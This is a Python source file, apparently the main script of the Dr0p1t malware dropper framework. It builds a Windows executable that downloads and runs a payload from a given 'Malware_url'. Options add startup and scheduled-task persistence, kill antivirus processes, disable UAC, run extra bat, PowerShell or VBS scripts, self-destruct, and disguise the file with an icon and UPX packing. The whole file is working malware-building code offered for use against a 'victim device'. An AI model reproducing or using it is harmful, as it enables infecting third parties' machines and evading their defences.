#!/usr/bin/python3
#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
from core.banners import random_banner as banner
from core.color import *
from core import color,updater
import argparse ,os ,textwrap ,sys ,subprocess, shutil ,random

parser = argparse.ArgumentParser(
usage=argparse.SUPPRESS,
prog='Dr0p1t.py',
formatter_class=argparse.RawDescriptionHelpFormatter,
description=textwrap.dedent( warn() ),
epilog="""\nExamples :
./Dr0p1t.py Malware_Url [Options]
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --upx
./Dr0p1t.py https://test.com/backdoor.exe -k -b block_online_scan.bat --only32
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k -p Enable_PSRemoting.ps1
./Dr0p1t.py https://test.com/backdoor.exe -s -t -k --nouac -i flash.ico

Note : Scripts like (bat\\ps1\\vbs) can only loaded from the scripts folder.
        So if you wanna use custom scripts made by yourself,put it in the scripts folder.
"""
)
parser.add_argument("url", metavar='Malware_url',nargs="?", help="Url to your malware")
parser.add_argument("-s", action='store_true', help="Add your malware to startup (Persistence)")
parser.add_argument("-t", action='store_true', help="Add your malware to task scheduler (Persistence)")
parser.add_argument("-k", action='store_true', help="Kill antivirus process before running your malware.")
parser.add_argument("-b", help="Run this batch script before running your malware. Check scripts folder")
parser.add_argument("-p", help="Run this powershell script before running your malware. Check scripts folder")
parser.add_argument("-v", help="Run this vbs script before running your malware. Check scripts folder")
parser.add_argument("--only32",action='store_true', help="Download your malware for 32 bit devices only")
parser.add_argument("--only64",action='store_true', help="Download your malware for 64 bit devices only")
parser.add_argument("--upx",action='store_true', help="Use UPX to compress the final file.")
parser.add_argument("--nouac",action='store_true', help="Try to disable UAC on victim device")
parser.add_argument("--nocompile",action='store_true', help="Tell the framework to not compile the final file.")
parser.add_argument("-i", help="Use icon to the final file. Check icons folder.")
parser.add_argument("-q", action='store_true', help="Stay quite ( no banner )")
parser.add_argument("-u", action='store_true', help="Check for updates")
parser.add_argument("-nd", action='store_true', help="Display less output information")
args = parser.parse_args()

def PyInstaller():
    if os.name=="nt":
        installer = "pyinstaller"
    else:
        if sys.platform == "darwin": # On osx, the default .wine directory is located on $HOME/.wine/
            installer = "wine " + os.environ['HOME'] + "/.wine/drive_c/Python27/python.exe " + os.environ['HOME'] + "/.wine/drive_c/Python27/Scripts/pyinstaller-script.py"
        else: # TODO: find all defaults location for .wine , or request it directely to the user if not found.
            installer = "wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py"

    p = subprocess.Popen( installer + " -h",shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE )
    x = p.stdout.read().decode()
    if x == "":
        return False
    elif x != "":
        return True

def get_code(f):
    code = open( f,"r" ).read()
    return code.split("#Start\n")[1]

def make_copy( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()

def random_name():
    return "Your_daily_malware_" + str(random.randint(0,100))

def clear():
    if os.name=="nt":
        x=os.system("cls")
    else:
        x=os.system("clear")

def prepare_folder(folder):
    x  = shutil.rmtree(folder, ignore_errors=True)
    xx = os.mkdir(folder)
    xfx = open( os.path.join(folder,"README.md"),"w")
    xfx.write("# Don't mess with this folder or delete it\n")
    xfx.close()

def get_executable():
    return os.listdir("dist")[0]

def main():
    prepare_folder("temp")
    prepare_folder("output")
    clear()
    if args.u:
        updater.check()
        sys.exit(0)

    if not args.u:
        if not args.url:
            print( parser.print_help() )
            x=sys.exit(0)

    if not args.q:
        banner()
    
    if os.name=="nt":
        installer = "pyinstaller"
        exe = ""
    else:
        if sys.platform == "darwin": # On osx, the default .wine directory is located on $HOME/.wine/
            installer = "wine " + os.environ['HOME'] + "/.wine/drive_c/Python27/python.exe " + os.environ['HOME'] + "/.wine/drive_c/Python27/Scripts/pyinstaller-script.py"
        else: # TODO: find all defaults location for .wine , or request it directely to the user if not found.
            installer = "wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py"
        exe = "wine "

    url      = args.url
    p        = "resources"
    fullp    = os.getcwd()
    command  = installer +" -F --noupx {} "
    bat_path = ["scripts","bat"]
    ps1_path = ["scripts","powershell"]
    vbs_path = ["scripts","vbs"]
    f        = ""

    print_status(args)
    colored_print( " [*] Creating DR0P3R..","g" )

    f += 'import subprocess\n'

    if args.k:
        if not args.nd:
            colored_print( " [*] Adding kill antivirus function..","g" )
        f += get_code( os.path.join(p,"killav.py") )+"\n"

    if sys.version_info[0]==3:
    	f += 'from urllib.request import urlretrieve\n'
    elif sys.version_info[0]==2:
    	f += 'from urllib import urlretrieve\n'

    f += get_code( os.path.join(p,"dropper.py") )+"\n"

    if "http" not in url:
        url = "http://"+url

    if args.only32:
        f += 'fire_things_up("{}",arch="32")\n'.format( url )
    elif args.only64:
        f += 'fire_things_up("{}",arch="64")\n'.format( url )
    elif not args.only32 or not args.only64:
        f += 'fire_things_up("{}")\n'.format( url )

    if args.s:
        if not args.nd:
            colored_print( " [*] Adding startup function..","g" )
        if "from random import randint" not in f:
            f+="from random import randint\n"
        if "File = 'hosts.exe'" not in f:
            f+="File = 'hosts.exe'\n"
        f += get_code( os.path.join(p,"add2startup.py") )+"\n"

    if args.t:
        if not args.nd:
            colored_print( " [*] Adding task function..","g" )
        if "from random import randint" not in f:
            f+="from random import randint\n"
        if "File = 'hosts.exe'" not in f:
            f+="File = 'hosts.exe'\n"
        f += get_code( os.path.join(p,"add2task.py") )+"\n"

    if args.b:
        try :
            if not args.nd:
                colored_print( " [*] Adding runbat function..","g" )
            bat_path.append(args.b)
            ff = open( os.path.join(*bat_path ) ).read()
            f += "Bat_Script_Data = '''{}'''\n".format( ff )
            f += get_code( os.path.join(p,"Runbat.py") )+"\n"
        except:
            colored_print( " [!] Error in reading bat file,are you sure it's in scripts folder ?","r" )

    if args.p:
        try :
            if not args.nd:
                colored_print( " [*] Adding runps1 function..","g" )
            ps1_path.append(args.p)
            ff = open( os.path.join(*ps1_path ) ).read()
            f += "Ps1_Script_Data = '''{}'''\n".format( ff )
            f += get_code( os.path.join(p,"Runps1.py") )+"\n"
        except :
            colored_print( " [!] Error in reading ps1 file,are you sure it's in scripts folder ?","r" )

    if args.v:
        try :
            if not args.nd:
                colored_print( " [*] Adding runvbs function..","g" )
            vbs_path.append(args.v)
            ff = open( os.path.join(*vbs_path ) ).read()
            f += "Vbs_Script_Data = '''{}'''\n".format( ff )
            f += get_code( os.path.join(p,"Runvbs.py") )+"\n"
        except :
            colored_print( " [!] Error in reading vbs file,are you sure it's in scripts folder ?","r" )

    if args.nouac:
        if not args.nd:
            colored_print( " [*] Adding disable UAC function..","g" )
        f += get_code( os.path.join(p,"Disable_UAC.py") )+"\n"

    colored_print( " [*] Adding self destruct function..","g" )
    f += get_code( os.path.join(p,"SelfDestruct.py") )+"\n"
    colored_print( " [*] Saving the final file..","g" )
    file_name = random_name()
    os.chdir("temp")
    fo = open( file_name+".py","w" )
    fo.write(f)
    fo.close()

    if not args.nocompile:
        if PyInstaller():
            colored_print( " [*] Compiling the final file to exe..","g" )
            if args.i:
                try:
                    if not args.nd:
                        colored_print( " [*] Adding icon to the final file..","g" )
                    ff = open( os.path.join(fullp,"icons",args.i) ).read()
                    command += "--icon=" + os.path.join(fullp,"icons",args.i)
                except:
                    colored_print( " [!] Error in icon file,are you sure it's in icons folder ?","r" )

            try:
                p  = subprocess.Popen( command.format(file_name+".py"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                (output, err) = p.communicate()
                pw = p.wait()
            except:
                colored_print( " [!] Error in compiling file,are you sure pyinstaller is installed ?","r" )
                sys.exit(0)

            file_name = get_executable()

            if args.upx:
                if not args.nd:
                    colored_print( " [*] Compressing the final file..","g" )
                x = subprocess.Popen(exe + os.path.join("utils","upx.exe") +" -9 "+os.path.join("output",file_name) ,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE )

            os.chdir("..")
            make_copy( os.path.join("temp","dist",file_name),os.path.join("output",file_name) )
        else:
            colored_print( " [!] PyInstaller not installed : Can't compile file to exe..","r" )

    elif args.nocompile:
        file_name = file_name+".py"
        os.chdir("..")
        blah = os.rename( os.path.join( "temp",file_name ),os.path.join( "output",file_name ) )

    colored_print( " [*] Finished and saved our Dr0pp3r as "+file_name+" in output folder ( happy hunting )","m" )

if __name__ == '__main__':
    main()
